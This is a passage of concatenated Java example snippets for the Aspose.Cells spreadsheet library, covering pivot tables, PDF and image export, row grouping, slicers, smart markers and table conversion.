opts.setHtmlCrossStringType(HtmlCrossType.CROSS);
opts.setHtmlCrossStringType(HtmlCrossType.FIT_TO_CELL);
 
//Output Html
String strHtmlCrossStringType = strsHtmlCrossStringType[opts.getHtmlCrossStringType()];
wb.save(""out"" + strHtmlCrossStringType + "".htm"", opts);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(VerifyPassword.class) + ""LoadingSavingConvertingAndManaging/"";


// Create a Stream object
FileInputStream fstream = new FileInputStream(dataDir + ""EncryptedBook1.xlsx"");


boolean isPasswordValid = FileFormatUtil.verifyPassword(fstream, ""1234"");


System.out.println(""Password is Valid: "" + isPasswordValid);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(WorksheetToImage.class) + ""LoadingSavingConvertingAndManaging/"";


// Instantiate a new workbook with path to an Excel file
Workbook book = new Workbook(dataDir + ""MyTestBook1.xlsx"");


// Create an object for ImageOptions
ImageOrPrintOptions imgOptions = new ImageOrPrintOptions();


// Set the image type
imgOptions.setImageType(ImageType.PNG);


// Get the first worksheet.
Worksheet sheet = book.getWorksheets().get(0);


// Create a SheetRender object for the target sheet
SheetRender sr = new SheetRender(sheet, imgOptions);
for (int j = 0; j < sr.getPageCount(); j++) {
 // Generate an image for the worksheet
 sr.toImage(j, dataDir + ""WToImage-out"" + j + "".png"");
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
public class CustomizeGlobalizationSettingsforPivotTable {
 
 class CustomPivotTableGlobalizationSettings extends GlobalizationSettings
	{   
 //Gets the name of ""Total"" label in the PivotTable.
 //You need to override this method when the PivotTable contains two or more PivotFields in the data area.
 public String getPivotTotalName()
	    {
 System.out.println(""---------GetPivotTotalName-------------"");
 return ""AsposeGetPivotTotalName"";
	    }
 
 //Gets the name of ""Grand Total"" label in the PivotTable.
 public String getPivotGrandTotalName()
	    {
 System.out.println(""---------GetPivotGrandTotalName-------------"");
 return ""AsposeGetPivotGrandTotalName"";
	    }
 
 //Gets the name of ""(Multiple Items)"" label in the PivotTable.
 public String getMultipleItemsName()
	    {
 System.out.println(""---------GetMultipleItemsName-------------"");
 return ""AsposeGetMultipleItemsName"";
	    }
 
 //Gets the name of ""(All)"" label in the PivotTable.
 public String getAllName()
	    {
 System.out.println(""---------GetAllName-------------"");
 return ""AsposeGetAllName"";
	    }
 
 //Gets the name of ""Column Labels"" label in the PivotTable.
 public String getColumnLabelsOfPivotTable()
	    {
 System.out.println(""---------GetColumnLabelsOfPivotTable-------------"");
 return ""AsposeGetColumnLabelsOfPivotTable"";
	    }
 
 //Gets the name of ""Row Labels"" label in the PivotTable.
 public String getRowLabelsNameOfPivotTable()
	    {
 System.out.println(""---------GetRowLabelsNameOfPivotTable-------------"");
 return ""AsposeGetRowLabelsNameOfPivotTable"";
	    }
 
 //Gets the name of ""(blank)"" label in the PivotTable.
 public String getEmptyDataName()
	    {
 System.out.println(""---------GetEmptyDataName-------------"");
 return ""(blank)AsposeGetEmptyDataName"";
	    }
 
 //Gets the name of PivotFieldSubtotalType type in the PivotTable.
 public String getSubTotalName(int subTotalType)
	    {
 System.out.println(""---------GetSubTotalName-------------"");
 
 switch (subTotalType)
	        {
 case PivotFieldSubtotalType.SUM:
 return ""AsposeSum"";//polish
 
 case PivotFieldSubtotalType.COUNT:
 return ""AsposeCount"";
 
 case PivotFieldSubtotalType.AVERAGE:
 return ""AsposeAverage"";
 
 case PivotFieldSubtotalType.MAX:
 return ""AsposeMax"";
 
 case PivotFieldSubtotalType.MIN:
 return ""AsposeMin"";
 
 case PivotFieldSubtotalType.PRODUCT:
 return ""AsposeProduct"";
 
 case PivotFieldSubtotalType.COUNT_NUMS:
 return ""AsposeCount"";
 
 case PivotFieldSubtotalType.STDEV:
 return ""AsposeStdDev"";
 
 case PivotFieldSubtotalType.STDEVP:
 return ""AsposeStdDevp"";
 
 case PivotFieldSubtotalType.VAR:
 return ""AsposeVar"";
 
 case PivotFieldSubtotalType.VARP:
 return ""AsposeVarp"";
 
	        }
 
 return ""AsposeSubTotalName"";
	    }
 
	}


 public void RunCustomizeGlobalizationSettingsforPivotTable() throws Exception
	{
 // The path to the documents directory.
 String dataDir = Utils.getSharedDataDir(CustomizeGlobalizationSettingsforPivotTable.class) + ""PivotTables/"";
 
 //Load your excel file
 Workbook wb = new Workbook(dataDir + ""samplePivotTableGlobalizationSettings.xlsx"");
 
 //Setting Custom Pivot Table Globalization Settings
 wb.getSettings().setGlobalizationSettings(new CustomPivotTableGlobalizationSettings());
 
 //Hide first worksheet that contains the data of the pivot table
 wb.getWorksheets().get(0).setVisible(false);
 
 //Access second worksheet
 Worksheet ws = wb.getWorksheets().get(1);
 
 //Access the pivot table, refresh and calculate its data
 PivotTable pt = ws.getPivotTables().get(0);
 pt.setRefreshDataFlag(true);
 pt.refreshData();
 pt.calculateData();
 pt.setRefreshDataFlag(false);
 
 //Pdf save options - save entire worksheet on a single pdf page
 PdfSaveOptions options = new PdfSaveOptions();
 options.setOnePagePerSheet(true);
 
 //Save the output pdf 
 wb.save(dataDir + ""outputPivotTableGlobalizationSettings.pdf"", options);


	}


 public static void main(String[] args) throws Exception {
 CustomizeGlobalizationSettingsforPivotTable pg = new CustomizeGlobalizationSettingsforPivotTable();
 pg.RunCustomizeGlobalizationSettingsforPivotTable();
	}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Instantiating a Workbook object
Workbook workbook = new Workbook(srcDir + ""sourcePivotTable.xlsx"");


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Access first pivot table inside the worksheet
PivotTable pivotTable = worksheet.getPivotTables().get(0);


// Access pivot table refresh by who property
System.out.println(""Pivot table refresh by who = "" + pivotTable.getRefreshedByWho());


// Access pivot table refresh date
System.out.println(""Pivot table refresh date = "" + pivotTable.getRefreshDate());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the output directory.
String sourceDir = Utils.Get_SourceDirectory();
String outputDir = Utils.Get_OutputDirectory();


Workbook wb = new Workbook(sourceDir + ""SamplePivotSort.xlsx"");


// Obtaining the reference of the newly added worksheet
Worksheet sheet = wb.getWorksheets().get(0);


PivotTableCollection pivotTables = sheet.getPivotTables();


// source PivotTable
// Adding a PivotTable to the worksheet
int index = pivotTables.add(""=Sheet1!A1:C10"", ""E3"", ""PivotTable2"");


//Accessing the instance of the newly added PivotTable
PivotTable pivotTable = pivotTables.get(index);


// Unshowing grand totals for rows.
pivotTable.setRowGrand(false);
pivotTable.setColumnGrand(false);


// Dragging the first field to the row area.
pivotTable.addFieldToArea(PivotFieldType.ROW, 1);
PivotField rowField = pivotTable.getRowFields().get(0);
rowField.setAutoSort(true);
rowField.setAscendSort(true);


// Dragging the second field to the column area.
pivotTable.addFieldToArea(PivotFieldType.COLUMN, 0);
PivotField colField = pivotTable.getColumnFields().get(0);
colField.setNumberFormat(""dd/mm/yyyy"");
colField.setAutoSort(true);
colField.setAscendSort(true);


// Dragging the third field to the data area.
pivotTable.addFieldToArea(PivotFieldType.DATA, 2);


pivotTable.refreshData();
pivotTable.calculateData();
// end of source PivotTable




// sort the PivotTable on ""SeaFood"" row field values
// Adding a PivotTable to the worksheet
index = pivotTables.add(""=Sheet1!A1:C10"", ""E10"", ""PivotTable2"");


// Accessing the instance of the newly added PivotTable
pivotTable = pivotTables.get(index);


// Unshowing grand totals for rows.
pivotTable.setRowGrand(false);
pivotTable.setColumnGrand(false);


// Dragging the first field to the row area.
pivotTable.addFieldToArea(PivotFieldType.ROW, 1);
rowField = pivotTable.getRowFields().get(0);
rowField.setAutoSort(true);
rowField.setAscendSort(true);


// Dragging the second field to the column area.
pivotTable.addFieldToArea(PivotFieldType.COLUMN, 0);
colField = pivotTable.getColumnFields().get(0);
colField.setNumberFormat(""dd/mm/yyyy"");
colField.setAutoSort(true);
colField.setAscendSort(true);
colField.setAutoSortField(0);




//Dragging the third field to the data area.
pivotTable.addFieldToArea(PivotFieldType.DATA, 2);


pivotTable.refreshData();
pivotTable.calculateData();
// end of sort the PivotTable on ""SeaFood"" row field values




// sort the PivotTable on ""28/07/2000"" column field values
// Adding a PivotTable to the worksheet
index = pivotTables.add(""=Sheet1!A1:C10"", ""E18"", ""PivotTable2"");


// Accessing the instance of the newly added PivotTable
pivotTable = pivotTables.get(index);


// Unshowing grand totals for rows.
pivotTable.setRowGrand(false);
pivotTable.setColumnGrand(false);
// Dragging the first field to the row area.
pivotTable.addFieldToArea(PivotFieldType.ROW, 1);
rowField = pivotTable.getRowFields().get(0);
rowField.setAutoSort(true);
rowField.setAscendSort(true);
rowField.setAutoSortField(0);


// Dragging the second field to the column area.
pivotTable.addFieldToArea(PivotFieldType.COLUMN, 0);
colField = pivotTable.getColumnFields().get(0);
colField.setNumberFormat(""dd/mm/yyyy"");
colField.setAutoSort(true);
colField.setAscendSort(true);




// Dragging the third field to the data area.
pivotTable.addFieldToArea(PivotFieldType.DATA, 2);


pivotTable.refreshData();
pivotTable.calculateData();
// end of sort the PivotTable on ""28/07/2000"" column field values




//Saving the Excel file
wb.save(outputDir + ""out_java.xlsx"");
PdfSaveOptions options = new PdfSaveOptions();
options.setOnePagePerSheet(true);
wb.save(outputDir + ""out_java.pdf"", options);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// directories
String sourceDir = Utils.Get_SourceDirectory();
String outputDir = Utils.Get_OutputDirectory();


// Load a template file
Workbook workbook = new Workbook(sourceDir + ""PivotTableSample.xlsx"");


// Get the first worksheet
Worksheet sheet = workbook.getWorksheets().get(0);
int pivotIndex = 0;


// Get the pivot tables in the sheet
PivotTable pivotTable = sheet.getPivotTables().get(pivotIndex);


// Accessing the data fields.
PivotFieldCollection pivotFields = pivotTable.getDataFields();


// Accessing the first data field in the data fields.
PivotField pivotField = pivotFields.get(0);


// Setting data display format
pivotField.setDataDisplayFormat(PivotFieldDataDisplayFormat.RANK_LARGEST_TO_SMALLEST);


pivotTable.calculateData();
// Saving the Excel file
workbook.save(outputDir + ""PivotTableDataDisplayFormatRanking_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Source directory
String sourceDir = Utils.Get_SourceDirectory();


// Load sample file
Workbook workbook = new Workbook(sourceDir + ""SamplePivotTableExternalConnection.xlsx"");


Worksheet worksheet = workbook.getWorksheets().get(0);


// Get the pivot table
PivotTable pivotTable = worksheet.getPivotTables().get(0);


// Print External Connection Details
System.out.println(""External Connection Data Source"");
System.out.println(""Name: "" + pivotTable.getExternalConnectionDataSource().getName());
System.out.println(""Type: "" + pivotTable.getExternalConnectionDataSource().getType());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String outputDir = Utils.Get_OutputDirectory();


// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Obtaining the reference of the newly added worksheet
Worksheet sheet = workbook.getWorksheets().get(0);


Cells cells = sheet.getCells();


// Setting the value to the cells
Cell cell = cells.get(""A1"");
cell.putValue(""Sport"");
cell = cells.get(""B1"");
cell.putValue(""Quarter"");
cell = cells.get(""C1"");
cell.putValue(""Sales"");


cell = cells.get(""A2"");
cell.putValue(""Golf"");
cell = cells.get(""A3"");
cell.putValue(""Golf"");
cell = cells.get(""A4"");
cell.putValue(""Tennis"");
cell = cells.get(""A5"");
cell.putValue(""Tennis"");
cell = cells.get(""A6"");
cell.putValue(""Tennis"");
cell = cells.get(""A7"");
cell.putValue(""Tennis"");
cell = cells.get(""A8"");
cell.putValue(""Golf"");


cell = cells.get(""B2"");
cell.putValue(""Qtr3"");
cell = cells.get(""B3"");
cell.putValue(""Qtr4"");
cell = cells.get(""B4"");
cell.putValue(""Qtr3"");
cell = cells.get(""B5"");
cell.putValue(""Qtr4"");
cell = cells.get(""B6"");
cell.putValue(""Qtr3"");
cell = cells.get(""B7"");
cell.putValue(""Qtr4"");
cell = cells.get(""B8"");
cell.putValue(""Qtr3"");


cell = cells.get(""C2"");
cell.putValue(1500);
cell = cells.get(""C3"");
cell.putValue(2000);
cell = cells.get(""C4"");
cell.putValue(600);
cell = cells.get(""C5"");
cell.putValue(1500);
cell = cells.get(""C6"");
cell.putValue(4070);
cell = cells.get(""C7"");
cell.putValue(5000);
cell = cells.get(""C8"");
cell.putValue(6430);


PivotTableCollection pivotTables = sheet.getPivotTables();


// Adding a PivotTable to the worksheet
int index = pivotTables.add(""=A1:C8"", ""E3"", ""PivotTable2"");


// Accessing the instance of the newly added PivotTable
PivotTable pivotTable = pivotTables.get(index);


// Unshowing grand totals for rows.
pivotTable.setRowGrand(false);


// Draging the first field to the row area.
pivotTable.addFieldToArea(PivotFieldType.ROW, 0);


// Draging the second field to the column area.
pivotTable.addFieldToArea(PivotFieldType.COLUMN, 1);


// Draging the third field to the data area.
pivotTable.addFieldToArea(PivotFieldType.DATA, 2);


pivotTable.calculateData();


// Saving the ODS file
workbook.save(outputDir + ""PivotTableSaveInODS_out.ods"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the output directory.
String sourceDir = Utils.Get_SourceDirectory();
String outputDir = Utils.Get_OutputDirectory();


Workbook workbook = new Workbook(sourceDir + ""PivotTableHideAndSortSample.xlsx"");


Worksheet worksheet = workbook.getWorksheets().get(0);


PivotTable pivotTable = worksheet.getPivotTables().get(0);
CellArea dataBodyRange = pivotTable.getDataBodyRange();
int currentRow = 3;
int rowsUsed = dataBodyRange.EndRow;


// Sorting score in descending
PivotField field = pivotTable.getRowFields().get(0);
field.setAutoSort(true);
field.setAscendSort(false);
field.setAutoSortField(0);


pivotTable.refreshData();
pivotTable.calculateData();


// Hiding rows with score less than 60
while (currentRow < rowsUsed)
{
 Cell cell = worksheet.getCells().get(currentRow, 1);
 double score = (double) cell.getValue();
 if (score < 60)
	{
 worksheet.getCells().hideRow(currentRow);
	}
 currentRow++;
}


pivotTable.refreshData();
pivotTable.calculateData();


// Saving the Excel file
workbook.save(outputDir + ""PivotTableHideAndSort_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Load template file
Workbook wb = new Workbook(srcDir + ""samplePivotTable.xlsx"");


// Get first pivot table in the worksheet
PivotTable pt = wb.getWorksheets().get(1).getPivotTables().get(0);


// Set pivot field
pt.showReportFilterPage(pt.getPageFields().get(0));


// Set position index for showing report filter pages
pt.showReportFilterPageByIndex(pt.getPageFields().get(0).getPosition());


// Set the page field name
pt.showReportFilterPageByName(pt.getPageFields().get(0).getName());


// Save the output file
wb.save(outDir + ""outputSamplePivotTable.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load source Excel file 
Workbook wb = new Workbook(srcDir + ""samplePdfBookmarkEntry_DestinationName.xlsx"");
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Access cell C5
Cell cell = ws.getCells().get(""C5"");
 
//Create Bookmark and Destination for this cell
PdfBookmarkEntry bookmarkEntry = new PdfBookmarkEntry();
bookmarkEntry.setText(""Text"");
bookmarkEntry.setDestination(cell);
bookmarkEntry.setDestinationName(""AsposeCells--"" + cell.getName());
 
//Access cell G56
cell = ws.getCells().get(""G56"");
 
//Create Sub-Bookmark and Destination for this cell
PdfBookmarkEntry subbookmarkEntry1 = new PdfBookmarkEntry();
subbookmarkEntry1.setText(""Text1"");
subbookmarkEntry1.setDestination(cell);
subbookmarkEntry1.setDestinationName(""AsposeCells--"" + cell.getName());
 
//Access cell L4
cell = ws.getCells().get(""L4"");
 
//Create Sub-Bookmark and Destination for this cell
PdfBookmarkEntry subbookmarkEntry2 = new PdfBookmarkEntry();
subbookmarkEntry2.setText(""Text2"");
subbookmarkEntry2.setDestination(cell);
subbookmarkEntry2.setDestinationName(""AsposeCells--"" + cell.getName());
 
//Add Sub-Bookmarks in list
ArrayList list = new ArrayList();
list.add(subbookmarkEntry1);
list.add(subbookmarkEntry2);
 
//Assign Sub-Bookmarks list to Bookmark Sub-Entry
bookmarkEntry.setSubEntry(list);
 
//Create PdfSaveOptions and assign Bookmark to it
PdfSaveOptions opts = new PdfSaveOptions();
opts.setBookmark(bookmarkEntry);
 
//Save the workbook in Pdf format with given pdf save options
wb.save(outDir + ""outputPdfBookmarkEntry_DestinationName.pdf"", opts);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Implement IStreamProvider
class MyStreamProvider implements IStreamProvider {


 public void closeStream(StreamProviderOptions options) throws Exception {
 System.out.println(""-----Close Stream-----"");
	}


 public void initStream(StreamProviderOptions options) throws Exception {
 System.out.println(""-----Init Stream-----"");


 // Read the new image in a memory stream and assign it to Stream property
 File imgFile = new File( srcDir + ""newPdfSaveOptions_StreamProvider.png"");


 byte[] bts = new byte[(int) imgFile.length()];


 FileInputStream fin = new FileInputStream(imgFile);
 fin.read(bts);
 fin.close();


 ByteArrayOutputStream baout = new ByteArrayOutputStream();
 baout.write(bts);
 baout.close();
 
 options.setStream(baout);
	}
}//MyStreamProvider


// ------------------------------------------------
// ------------------------------------------------


void Run() throws Exception {
 
 // Load source Excel file containing external image
 Workbook wb = new Workbook(srcDir + ""samplePdfSaveOptions_StreamProvider.xlsx"");


 // Specify Pdf Save Options - Stream Provider
 PdfSaveOptions opts = new PdfSaveOptions();
 opts.setOnePagePerSheet(true);
 opts.setStreamProvider(new MyStreamProvider());


 // Save the workbook to Pdf
 wb.save(outDir + ""outputPdfSaveOptions_StreamProvider.pdf"", opts);
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load the Sample Workbook that throws Error on Excel2Pdf conversion
Workbook wb = new Workbook(""sampleErrorExcel2Pdf.xlsx"");
 
//Specify Pdf Save Options - Ignore Error
PdfSaveOptions opts = new PdfSaveOptions();
opts.setIgnoreError(true);
 
//Save the Workbook in Pdf with Pdf Save Options
wb.save(""outputErrorExcel2Pdf.pdf"", opts);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


 String outDir = Utils.Get_OutputDirectory();
 
 // Create workbook
 Workbook wb = new Workbook();
 
 // Access first worksheet - it is empty sheet
 Worksheet ws = wb.getWorksheets().get(0);
 
 // Specify image or print options
 // Since the sheet is blank, we will set
 // OutputBlankPageWhenNothingToPrint to true
 // So that empty page gets printed
 ImageOrPrintOptions opts = new ImageOrPrintOptions();
 opts.setImageType(ImageType.PNG);
 opts.setOutputBlankPageWhenNothingToPrint(true);
 
 // Render empty sheet to png image
 SheetRender sr = new SheetRender(ws, opts);
 sr.toImage(0, outDir + ""OutputBlankPageWhenNothingToPrint.png"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
 
//Load the sample Excel file
Workbook wb = new Workbook(srcDir + ""sampleImageOrPrintOptions_PageIndexPageCount.xlsx"");
 
//Access the first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Specify image or print options
//We want to print pages 4, 5, 6, 7
ImageOrPrintOptions opts = new ImageOrPrintOptions();
opts.setPageIndex(3);
opts.setPageCount(4);
opts.setImageType(ImageType.PNG);
 
//Create sheet render object
SheetRender sr = new SheetRender(ws, opts);
 
//Print all the pages as images
for (int i = opts.getPageIndex(); i < sr.getPageCount(); i++)
{
 sr.toImage(i, outDir + ""outputImage-"" + (i+1) + "".png"");
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Load the template file
 Workbook wb = new Workbook(srcDir + ""sampleCrosssType.xlsx"");


 // Initialize PDF save options
 PdfSaveOptions saveOptions = new PdfSaveOptions();
 
 // Set text criss type
 saveOptions.setTextCrossType(TextCrossType.STRICT_IN_CELL);
 
 // Save output PDF file
 wb.save(outDir + ""outputCrosssType.pdf"", saveOptions);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(AutofitRowsforMergedCells.class) + ""RowsAndColumns/"";


// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Accessing the first worksheet in the Excel file
Worksheet worksheet = workbook.getWorksheets().get(0);
 
// Create a range A1:B1
Range range = worksheet.getCells().createRange(0, 0, 1, 2);
 
// Merge the cells
range.merge();
 
// Insert value to the merged cell A1
worksheet.getCells().get(0, 0).setValue(""A quick brown fox jumps over the lazy dog. A quick brown fox jumps over the lazy dog....end"");
 
// Create a style object
Style style = worksheet.getCells().get(0, 0).getStyle();


// Set wrapping text on
style.setTextWrapped(true);


// Apply the style to the cell
worksheet.getCells().get(0, 0).setStyle(style);


// Create an object for AutoFitterOptions
AutoFitterOptions options = new AutoFitterOptions();


// Set auto-fit for merged cells
options.setAutoFitMergedCellsType(AutoFitMergedCellsType.EACH_LINE);


// Autofit rows in the sheet(including the merged cells)
worksheet.autoFitRows(options);


// Save the Excel file
workbook.save(dataDir + ""AutofitRowsforMergedCells_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(GroupingRowsandColumns.class) + ""RowsAndColumns/"";


// Instantiating a Workbook object
Workbook workbook = new Workbook(dataDir + ""Book1.xlsx"");


// Accessing the first worksheet in the Excel file
Worksheet worksheet = workbook.getWorksheets().get(0);
Cells cells = worksheet.getCells();


// Grouping first six rows (from 0 to 5) and making them hidden by
// passing true
cells.groupRows(0, 5, true);


// Grouping first three columns (from 0 to 2) and making them hidden by
// passing true
cells.groupColumns(0, 2, true);


// Setting SummaryRowBelow property to false
worksheet.getOutline().setSummaryRowBelow(true);


// Setting SummaryColumnRight property to false
worksheet.getOutline().setSummaryColumnRight(true);


// Saving the modified Excel file in default (that is Excel 2003) format
workbook.save(dataDir + ""GroupingRowsandColumns_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = Utils.getSharedDataDir(InsertingARowWithFormatting.class) + ""RowsAndColumns/"";
// Instantiating a Workbook object
Workbook workbook = new Workbook(dataDir + ""Book1.xlsx"");


// Accessing the first worksheet in the Excel file
Worksheet worksheet = workbook.getWorksheets().get(0);


// Setting Formatting options
InsertOptions insertOptions = new InsertOptions();
insertOptions.setCopyFormatType(CopyFormatType.SAME_AS_ABOVE);
 
// Inserting a row into the worksheet at 3rd position
worksheet.getCells().insertRows(2, 1, insertOptions);


// Saving the modified Excel file
workbook.save(dataDir + ""InsertingARowWithFormatting_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(SummaryRowBelow.class) + ""RowsAndColumns/"";


// Instantiating a Workbook object
Workbook workbook = new Workbook(dataDir + ""book1.xls"");


// Accessing the first worksheet in the Excel file
Worksheet worksheet = workbook.getWorksheets().get(0);
Cells cells = worksheet.getCells();


// Grouping first six rows (from 0 to 5) and making them hidden by passing true
cells.groupRows(0, 5, true);


// Grouping first three columns (from 0 to 2) and making them hidden by passing true
cells.groupColumns(0, 2, true);


// Setting SummaryRowBelow property to false
worksheet.getOutline().setSummaryRowBelow(false);


// Saving the modified Excel file in default (that is Excel 2003) format
workbook.save(dataDir + ""SummaryRowBelow_out.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(SummaryRowRight.class) + ""RowsAndColumns/"";


// Instantiating a Workbook object
Workbook workbook = new Workbook(dataDir + ""BookStyles.xls"");


// Accessing the first worksheet in the Excel file
Worksheet worksheet = workbook.getWorksheets().get(0);
Cells cells = worksheet.getCells();


// Grouping first six rows (from 0 to 5) and making them hidden by passing true
cells.ungroupRows(0, 5);


// Grouping first three columns (from 0 to 2) and making them hidden by passing true
cells.ungroupColumns(0, 2);


// Saving the modified Excel file in default (that is Excel 2003) format
workbook.save(dataDir + ""SummaryRowRight_out.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Load sample Excel file containing a table.
Workbook workbook = new Workbook(sourceDir + ""sampleCreateSlicerToExcelTable.xlsx"");


// Access first worksheet.
Worksheet worksheet = workbook.getWorksheets().get(0);


// Access first table inside the worksheet.
ListObject table = worksheet.getListObjects().get(0);


// Add slicer
int idx = worksheet.getSlicers().add(table, 0, ""H5"");


Slicer slicer = worksheet.getSlicers().get(idx);
slicer.setPlacement(PlacementType.FREE_FLOATING);
slicer.setRowHeightPixel(50);
slicer.setWidthPixel(500);
slicer.setTitle(""Aspose"");
slicer.setAlternativeText(""Alternate Text"");
slicer.setPrintable(false);
slicer.setLocked(false);


// Refresh the slicer.
slicer.refresh();


// Save the workbook in output XLSX format.
workbook.save(outputDir + ""outputChangeSlicerProperties.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Load sample Excel file containing a table.
Workbook workbook = new Workbook(sourceDir + ""sampleCreateSlicerToExcelTable.xlsx"");


// Access first worksheet.
Worksheet worksheet = workbook.getWorksheets().get(0);


// Access first table inside the worksheet.
ListObject table = worksheet.getListObjects().get(0);


// Add slicer
int idx = worksheet.getSlicers().add(table, 0, ""H5"");


// Save the workbook in output XLSX format.
workbook.save(outputDir + ""outputCreateSlicerToExcelTable.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
Workbook workbook = new Workbook(sourceDir + ""SampleSlicerChart.xlsx"");
workbook.save(outputDir + ""SampleSlicerChart.pdf"", SaveFormat.PDF);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Create array of strings that are actually Excel formulas
String str1 =  ""=\""01-This \"" & \""is \"" & \""concatenation\"""";
String str2 =  ""=\""02-This \"" & \""is \"" & \""concatenation\"""";
String str3 =  ""=\""03-This \"" & \""is \"" & \""concatenation\"""";
String str4 =  ""=\""04-This \"" & \""is \"" & \""concatenation\"""";
String str5 =  ""=\""05-This \"" & \""is \"" & \""concatenation\"""";
 
String[] TestFormula = new String[]{str1, str2, str3, str4, str5};
 
//Create a workbook
Workbook wb = new Workbook();
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Put the smart marker field with formula parameter in cell A1
Cells cells = ws.getCells();    
Cell cell = cells.get(""A1"");
cell.putValue(""&=$Test(formula)"");
 
//Create workbook designer, set data source and process it
WorkbookDesigner wd = new WorkbookDesigner(wb);
wd.setDataSource(""Test"", TestFormula);    
wd.process();
 
//Save the workbook in xlsx format
wb.save(outDir + ""outputUsingFormulaParameterInSmartMarkerField.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//Source directory
String sourceDir = Utils.Get_SourceDirectory();


//Output directory
String outputDir = Utils.Get_OutputDirectory();


// Open an existing file that contains a table/list object in it
Workbook workbook = new Workbook(sourceDir + ""SampleTable.xlsx"");


// Save the file
workbook.save(outputDir + ""ConvertTableToOds_out.ods"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ConvertTableToRangeWithOptions.class) + ""Tables/"";
// Open an existing file that contains a table/list object in it
Workbook workbook = new Workbook(dataDir + ""book1.xlsx"");
 
TableToRangeOptions options = new TableToRangeOptions();
options.setLastRow(5);


// Convert the first table/list object (from the first worksheet) to normal range
workbook.getWorksheets().get(0).getListObjects().get(0).convertToRange(options);


// Save the file
workbook.save(dataDir + ""ConvertTableToRangeWithOptions_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the output directory.
String sourceDir = Utils.Get_SourceDirectory();
String outputDir = Utils.Get_OutputDirectory();


// Load workbook object
Workbook workbook = new Workbook(sourceDir + ""SampleTableWithQueryTable.xls"");


Worksheet worksheet = workbook.getWorksheets().get(0);


ListObject table = worksheet.getListObjects().get(0);


// Check the data source type if it is query table
if (table.getDataSourceType() == TableDataSourceType.QUERY_TABLE)
{
 table.setShowTotals(true);
}


// Save the file
workbook.save(outputDir + ""SampleTableWithQueryTable_out.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//directories
String sourceDir = Utils.Get_SourceDirectory();
String outputDir = Utils.Get_OutputDirectory();
// Create workbook from source Excel file
Workbook workbook = new Workbook(sourceDir + ""SampleSubtotal.xlsx"");


// Access the first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Get the Cells collection in the first worksheet
Cells cells = worksheet.getCells();


// Create a cellarea i.e.., A2:B11
CellArea ca = CellArea.createCellArea(""A2"", ""B11"");


// Apply subtotal, the consolidation function is Sum and it will applied to
// Second column (B) in the list
cells.subtotal(ca, 0, ConsolidationFunction.SUM, new int[] { 1 }, true, false, true);


// Set the direction of outline summary
worksheet.getOutline().setSummaryRowBelow(true);


// Save the excel file
workbook.save(outputDir + ""ASubtotal_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(CheckForShapes.class) + ""TechnicalArticles/"";


// Create an instance of Workbook and load an existing spreadsheet
Workbook workbook = new Workbook(dataDir + ""SampleCheckCells.xlsx"");
// Loop over all worksheets in the workbook
for (int i = 0; i < workbook.getWorksheets().getCount(); i++) {
 Worksheet worksheet = workbook.getWorksheets().get(i);
 // Check if worksheet has populated cells
 if (worksheet.getCells().getMaxDataRow() != -1) {
 System.out.println(worksheet.getName() + "" is not empty because one or more cells are populated"");
	}
 // Check if worksheet has shapes
